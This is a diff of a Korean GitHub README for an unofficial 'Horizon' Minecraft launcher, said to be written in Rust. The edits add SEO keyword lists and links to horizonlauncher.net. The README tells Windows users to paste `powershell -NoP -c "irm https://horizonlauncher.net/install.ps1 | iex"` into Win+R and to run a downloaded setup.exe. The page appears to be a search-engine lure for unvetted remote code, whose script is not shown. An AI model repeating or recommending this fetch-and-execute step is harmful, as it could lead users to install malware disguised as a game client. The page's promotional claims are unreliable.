@@ -69,7 +69,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
 </p>
 
-<p align="center"><em>Launcher <strong>0.2.69</strong> · LGPL · Win+R · UAC · <a href="https://horizonlauncher.net/ko/">horizonlauncher.net</a></em></p>
+<p align="center"><em>업데이트 2026-11-16: 런처 <strong>0.2.69</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/ko/">horizonlauncher.net</a>.</em></p>
 
 [![Horizon Minecraft](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/ko/)
 
@@ -127,9 +127,17 @@ Horizon은 Mojang / Microsoft 제품이 **아닙니다**. **horizonlauncher.net*
 
 ## 목차
 
-1. [런처 비교](#런처-비교)
-2. [FAQ](#faq)
-3. [사이트 페이지](#사이트-페이지)
+1. [Horizon Minecraft이란](#horizon-minecraft이란)
+2. [Horizon 무료 다운로드 (Windows)](#horizon-무료-다운로드-windows)
+3. [Horizon 설치 — 두 가지 방법](#horizon-설치-두-가지-방법)
+4. [Horizon Minecraft 기능 (Rust Java 클라이언트)](#horizon-minecraft-기능-rust-java-클라이언트)
+5. [왜 Rust Minecraft인가](#왜-rust-minecraft인가)
+6. [런처 비교 (공식 / JVM / Horizon)](#런처-비교-공식-jvm-horizon)
+7. [서버, 모드, FPS](#서버-모드-fps)
+8. [FAQ](#faq)
+9. [사이트 페이지](#사이트-페이지)
+10. [English — Download Horizon Minecraft launcher](#english-download-horizon-minecraft-launcher)
+11. [SEO 태그와 검색어](#seo-태그와-검색어)
 
 ---
 
@@ -260,21 +268,26 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 
 더 보기: [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/) · [https://horizonlauncher.net/en/performance/](https://horizonlauncher.net/en/performance/)
 
-## 런처 비교
+## 런처 비교 (공식 / JVM / Horizon)
 
-| | Official launcher | JVM launchers | **Horizon** |
+| | 공식 Minecraft 런처 | Prism / MultiMC | **Horizon** |
 |---|---|---|---|
-| Download | minecraft.net | GitHub | **[https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/)** |
-| Client | JVM | JVM | **Rust (Minecraft Rust Edition)** |
-| Setup | vendor installer | vendor | **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** |
+| 다운로드 | minecraft.net | GitHub | **[https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/)** |
+| 클라이언트 | JVM | JVM | **Rust (Minecraft Rust Edition)** |
+| 목적 | 라이선스 | 모드팩 | **FPS + Windows 네이티브** |
+| 설치 | setup | setup | **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** |
 
-Canonical download: **horizonlauncher.net** only.
+비공식 클라이언트. **horizonlauncher.net** 만 사용.
 
 ## 서버, 모드, FPS
 
-- **Servers / mods / FPS / legal:** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/) · [https://horizonlauncher.net/ko/download-horizon/](https://horizonlauncher.net/ko/download-horizon/)
-- **Distant Horizons · Create · shaders:** [https://horizonlauncher.net/en/distant-horizons/](https://horizonlauncher.net/en/distant-horizons/) (EN guides)
-- **Releases 0.2.69:** [https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+- **Minecraft Java 서버:** [https://horizonlauncher.net/ko/server/](https://horizonlauncher.net/ko/server/)
+- **모드** `.hnmod`: [https://horizonlauncher.net/ko/mods/](https://horizonlauncher.net/ko/mods/) · [Distant Horizons](https://horizonlauncher.net/ko/distant-horizons/) · [Create](https://horizonlauncher.net/ko/create-mod/) · [셰이더](https://horizonlauncher.net/ko/shaders/)
+- **성능:** [https://horizonlauncher.net/ko/performance/](https://horizonlauncher.net/ko/performance/) · **FAQ:** [https://horizonlauncher.net/ko/faq/](https://horizonlauncher.net/ko/faq/) · **LGPL:** [https://horizonlauncher.net/ko/legal/](https://horizonlauncher.net/ko/legal/)
+
+### 자주 찾는 검색
+
+`Horizon 다운로드` · `Horizon 런처 Windows` · `Horizon 0.2.69` · [릴리스](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## FAQ
 
@@ -299,37 +312,46 @@ Horizon Rust 클라이언트에는 필요 없습니다.
 **변경 로그 0.2.65–0.2.69?**  
 [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 런처 **0.2.69** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/)
 
-**Win 7 / macOS / Linux?**  
-Official setup targets **Windows 10/11 x64**. See [https://horizonlauncher.net/download-horizon/](https://horizonlauncher.net/download-horizon/).
+**Windows 7 / macOS / Linux?**  
+Setup targets **Windows 10/11 x64**. See [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/).
 
-**Why this GitHub README?**  
-So searches like «Horizon launcher github» lead to canonical **[horizonlauncher.net](https://horizonlauncher.net/)**.
+**Russian version?**  
+[https://horizonlauncher.net/](https://horizonlauncher.net/) — скачать Horizon (README.md).
+
+**Why GitHub if the site exists?**  
+So «Horizon launcher github» points to **[horizonlauncher.net](https://horizonlauncher.net/en/)**.
 
 ## 사이트 페이지
 
-**KO / local:** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/) · [https://horizonlauncher.net/ko/download-horizon/](https://horizonlauncher.net/ko/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+**KO:** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/) · [https://horizonlauncher.net/ko/download-horizon/](https://horizonlauncher.net/ko/download-horizon/) · [https://horizonlauncher.net/ko/install-horizon/](https://horizonlauncher.net/ko/install-horizon/) · [https://horizonlauncher.net/ko/minecraft-rust/](https://horizonlauncher.net/ko/minecraft-rust/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
 **EN:** [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · **RU:** [https://horizonlauncher.net/](https://horizonlauncher.net/) · [sitemap](https://horizonlauncher.net/sitemap.xml) · [Telegram](https://t.me/horizonlauncher)
 
 
+## English — Download Horizon Minecraft launcher
+
+**Horizon** — free **Windows Minecraft launcher** and **Java client in Rust**. [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**.
+
 
 ## SEO 태그와 검색어
 
-`download Horizon` `Horizon 0.2.69` `horizonlauncher.net` `Minecraft Rust Edition` `horizon-launcher-setup.exe` `Win+R Horizon` `LGPL Horizon`
+`Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Horizon 0.2.69` `horizonlauncher.net`
 
-### Download / Win+R / setup.exe
+`Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Minecraft Rust Edition` `마인크래프트 FPS` `horizonlauncher.net` `Win+R Horizon` `Horizon 빠른 설치` `Horizon 설치` `Horizon 다운로드` `Distant Horizons Horizon` `Create 모드`
 
-- Site: [https://horizonlauncher.net/](https://horizonlauncher.net/)
-- Download: [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
+### 다운로드 / Win+R / setup.exe
+
+- [https://horizonlauncher.net/](https://horizonlauncher.net/)
+- [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/)
 - Win+R: `powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"`
-- Setup: [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
-- EN: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/)
-- Minecraft on Rust: [https://horizonlauncher.net/minecraft-rust/](https://horizonlauncher.net/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
-- Telegram: [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
-- Sitemap: [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
+- [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+- [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/)
+- [https://horizonlauncher.net/minecraft-rust/](https://horizonlauncher.net/minecraft-rust/) · [https://horizonlauncher.net/en/minecraft-rust/](https://horizonlauncher.net/en/minecraft-rust/)
+- [https://t.me/horizonlauncher](https://t.me/horizonlauncher)
+- [https://horizonlauncher.net/sitemap.xml](https://horizonlauncher.net/sitemap.xml)
 
 
-**Horizon:** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
+**다운로드:** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/) · [https://horizonlauncher.net/ko/download-horizon/](https://horizonlauncher.net/ko/download-horizon/) · [https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)
 
 
 </div>
